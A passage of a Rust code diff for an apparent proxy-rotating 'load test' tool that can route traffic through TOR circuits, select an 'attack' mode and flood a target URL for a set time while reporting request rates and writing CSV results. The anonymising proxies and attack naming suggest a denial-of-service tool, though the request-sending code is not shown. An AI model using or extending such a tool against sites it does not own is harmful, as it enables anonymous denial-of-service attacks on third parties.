-            Some(list)
+            println!("  Verifying {} proxies from file...", list.len());
+            let verified = filter_alive_proxies(&list, &state).await;
+            if verified.is_empty() {
+                eprintln!("  No alive proxies found in file {}", path);
+                None
+            } else {
+                Some(verified)
+            }
         }
     } else if let Some(url) = &tor_proxy {
         let n = concurrency.min(20);
@@ -844,7 +1069,8 @@ async fn main() {
         println!("  Using TOR_PROXY: {} ({} circuits)", url, n);
         Some(p)
     } else {
-        get_proxies(state.lock().await.mode, &state).await
+        let mode = { state.lock().await.mode };
+        get_proxies(mode, &state).await
     };
     match proxies {
         None => {
@@ -857,31 +1083,70 @@ async fn main() {
                 println!("  [DRY RUN] Skipping load test. Use without --dry-run to execute.");
                 // Write CSV output if requested
                 if let Some(path) = &output_csv {
-                    write_probe_csv(path, target_url, &status, &prox_list, concurrency, attack_str);
+                    write_probe_csv(path, &target_url, &status, &prox_list, concurrency, attack_str);
                 }
                 return;
             }
-            let pool = Arc::new(Mutex::new(ProxyPool::new(&prox_list)));
+            let pool = Arc::new(std::sync::Mutex::new(ProxyPool::new(&prox_list)));
             println!("[3/3] Running load for {}s...", duration_secs);
-            state.lock().await.running = true;
+            let stats = {
+                let st = state.lock().await;
+                st.stats.clone()
+            };
+            stats.running.store(true, Ordering::Relaxed);
             let state_clone = state.clone();
             let pool_clone = pool.clone();
-            tokio::spawn(run_load(state_clone, pool_clone, delay_ms, max_errors));
-            tokio::time::sleep(Duration::from_secs(duration_secs)).await;
-            state.lock().await.running = false;
-            let final_stats = {
-                let st = state.lock().await;
-                format!(
-                    "Completed: {} req, {} bytes ({:.2} KB/s)",
-                    st.total_requests,
-                    st.total_bytes,
-                    st.total_bytes as f64 / duration_secs as f64 / 1024.0,
-                )
-            };
+            let stats_clone = stats.clone();
+            let start = Instant::now();
+            let mut elapsed_secs = duration_secs;
+            tokio::spawn(run_load(state_clone, pool_clone, stats_clone, delay_ms, max_errors));
+
+            let mut last_requests = 0u64;
+            let mut last_bytes = 0u64;
+            let mut last_time = start;
+
+            while start.elapsed().as_secs() < duration_secs {
+                tokio::time::sleep(Duration::from_millis(1000)).await;
+                let cur_reqs = stats.total_requests.load(Ordering::Relaxed);
+                let cur_bytes = stats.total_bytes.load(Ordering::Relaxed);
+                let cur_errors = stats.errors.load(Ordering::Relaxed);
+
+                let now = Instant::now();
+                let delta_t = now.duration_since(last_time).as_secs_f64();
+                if delta_t > 0.0 {
+                    let req_rate = (cur_reqs - last_requests) as f64 / delta_t;
+                    let byte_rate = (cur_bytes - last_bytes) as f64 / delta_t / 1024.0;
+                    println!(
+                        "  [Elapsed: {}s] {:.1} req/s | {:.2} KB/s | Errors: {}",
+                        start.elapsed().as_secs(),
+                        req_rate,
+                        byte_rate,
+                        cur_errors
+                    );
+                }
+                last_requests = cur_reqs;
+                last_bytes = cur_bytes;
+                last_time = now;
+
+                if max_errors.is_some() && cur_errors >= max_errors.unwrap() {
+                    elapsed_secs = start.elapsed().as_secs().max(1);
+                    break;
+                }
+            }
+            stats.running.store(false, Ordering::Relaxed);
+
+            let final_reqs = stats.total_requests.load(Ordering::Relaxed);
+            let final_bytes = stats.total_bytes.load(Ordering::Relaxed);
+            let final_stats = format!(
+                "Completed: {} req, {} bytes ({:.2} KB/s)",
+                final_reqs,
+                final_bytes,
+                final_bytes as f64 / elapsed_secs as f64 / 1024.0,
+            );
             println!("  {}", final_stats);
             if let Some(ref path) = output_csv {
-                write_results_csv(path, target_url, &status, &prox_list, concurrency, attack_str,
-                    state.lock().await.total_requests, state.lock().await.total_bytes, duration_secs);
+                write_results_csv(path, &target_url, &status, &prox_list, concurrency, attack_str,
+                    final_reqs, final_bytes, elapsed_secs);
             }
         }
     }
